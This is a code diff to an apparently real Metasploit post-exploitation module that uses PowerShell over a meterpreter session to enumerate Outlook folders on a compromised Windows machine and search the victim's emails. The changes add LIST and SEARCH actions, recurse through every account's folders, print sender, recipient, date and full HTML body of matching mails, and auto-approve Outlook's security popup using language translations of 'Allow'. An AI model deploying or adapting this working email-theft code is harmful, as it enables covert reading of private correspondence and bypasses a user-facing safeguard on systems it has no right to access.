@@ -23,13 +23,17 @@ class Metasploit3 < Msf::Post
     'License'       => MSF_LICENSE,
     'Author'        => [ 'Wesley Neelen <security[at]forsec.nl>' ],
     'Platform'      => [ 'win' ],
-    'Arch'		    => [ 'x86', 'x64' ],
-    'SessionTypes'  => [ 'meterpreter']
+    'Arch'	    => [ 'x86', 'x64' ],
+    'SessionTypes'  => [ 'meterpreter'],
+    'Actions' => [
+                       [ 'LIST', { 'Description' => 'Lists all folders' } ],
+                       [ 'SEARCH', { 'Description' => 'Searches for an email' } ]
+    ],
+    'DefaultAction' => 'LIST'
   ))
 
   register_options(
   [
-    OptBool.new('LIST_FOLDERS', [ true, ' List the available folders', true]),
     OptString.new('FOLDER', [ false, ' The e-mailfolder to read (e.g. Inbox)' ]),
     OptString.new('KEYWORD', [ false, ' Search e-mails by the keyword specified here' ]),
     OptString.new('A_TRANSLATION', [ false, ' Fill in the translation of the word "Allow" in the targets system language, to click on the security popup.' ]),
@@ -37,17 +41,31 @@ class Metasploit3 < Msf::Post
     ], self.class)
   end
 
-
   def listBoxes
     # This function prints a listing of available mailbox folders
     psh_script = %Q|
-    function List-Folder {
-    Clear-host
-    Add-Type -Assembly "Microsoft.Office.Interop.Outlook"
-    $Outlook = New-Object -ComObject Outlook.Application
-    $Namespace = $Outlook.GetNameSpace("MAPI")
-    $NameSpace.Folders.Item(1).Folders \| FT FolderPath
+    function GetSubfolders($root) {
+        $folders = @()
+        $folders += $root
+        foreach ($folder in $root.Folders) {
+            $folders += GetSubfolders($folder)
+        }
+        return $folders
     }
+    function List-Folder {
+        Clear-host
+        Add-Type -Assembly "Microsoft.Office.Interop.Outlook"
+        $Outlook = New-Object -ComObject Outlook.Application
+        $Namespace = $Outlook.GetNameSpace("MAPI")
+        $account = $NameSpace.Folders
+        $folders = @()
+        foreach ($acc in $account) {
+            foreach ($folder in $acc.Folders) {
+                $folders += GetSubfolders($folder)
+            }
+        }
+        $folders \| FT FolderPath
+    }    
     List-Folder
     |
     utf16conv = Iconv.conv('UTF16LE', 'ASCII', psh_script)
@@ -58,6 +76,7 @@ class Metasploit3 < Msf::Post
     listBoxes_res.channel.close
     listBoxes_res.close
     currentidle = session.ui.idle_time
+    print("\n")
     print_status("System has currently been idle for #{currentidle} seconds")
   end
 
@@ -72,14 +91,17 @@ class Metasploit3 < Msf::Post
       Add-Type -Assembly "Microsoft.Office.Interop.Outlook"
       $Outlook = New-Object -ComObject Outlook.Application
       $Namespace = $Outlook.GetNameSpace("MAPI")
-      $NameSpace.Folders.Item(1)
+      $account = $NameSpace.Folders
+      $count = 0
       try {
-      $Email = $NameSpace.Folders.Item(1).Folders.Item($Folder).Items
-      $Email \| Where-Object {$_.$searchObject -like '*' + $searchTerm + '*'}
-      Write-Host $Email
-      } catch {
-        Write-Host "The folder does not exist in the Outlook installation. Please fill in a correct foldername."
-      }
+      foreach ($acc in $account) {
+         $count = $count+1
+         $Email = $NameSpace.Folders.Item($count).Folders.Item($Folder).Items
+         $Email \| Where-Object {$_.$searchObject -like '*' + $searchTerm + '*'} \| Format-List To, SenderEmailAddress, CreationTime, TaskSubject, HTMLBody 
+         }
+       } catch {
+         Write-Host "The folder does not exist in the Outlook installation. Please fill in a correct foldername."
+       }
       }
       Get-Emails "#{keyword}" "#{folder}" "#{searchobject}"
     |
@@ -110,21 +132,21 @@ class Metasploit3 < Msf::Post
 
   def run
     # Main method
-    list_folder = datastore['LIST_FOLDERS']
     folder	= datastore['FOLDER']
     keyword = datastore['KEYWORD'].to_s
     object	= "HTMLBody"
     allow 	= datastore['A_TRANSLATION']
     allow_access_for = datastore['ACF_TRANSLATION']
-    langNotSupported = false
+    langNotSupported = true
 
     # OS language check
     sysLang = client.sys.config.sysinfo['System Language']
-    if sysLang != "en_US" and sysLang != "NL"
-        langNotSupported = true
-    else
-      atrans = A_HASH[sysLang]
-      acftrans = ACF_HASH[sysLang]
+    A_HASH.each do |key, val|
+        if sysLang == key
+           langNotSupported = false
+           atrans = A_HASH[sysLang]
+           acftrans = ACF_HASH[sysLang]
+        end
     end
 
     if allow and allow_access_for
@@ -132,7 +154,7 @@ class Metasploit3 < Msf::Post
        acftrans = allow_access_for
     else
        if langNotSupported == true
-           print_error ("System language not supported, only English (en-US) and Dutch (NL) are supported, you can specify the targets system translations in the options A_TRANSLATION (Allow) and ACF_TRANSLATION (Allow access for)")
+           print_error ("System language not supported, you can specify the targets system translations in the options A_TRANSLATION (Allow) and ACF_TRANSLATION (Allow access for)")
            abort()
        end
     end
@@ -169,16 +191,13 @@ class Metasploit3 < Msf::Post
       abort()
     end
 
-    if list_folder
+    if action.name == "LIST"
       print_good('Available folders in the mailbox: ')
       listBoxes()
-    else
-      print_status('Not printing folders, LIST_FOLDERS disabled')
     end
 
-    if folder and folder != ""
+    if action.name == "SEARCH"
       readEmails(folder,keyword,object,atrans,acftrans)
     end
   end
 end
-
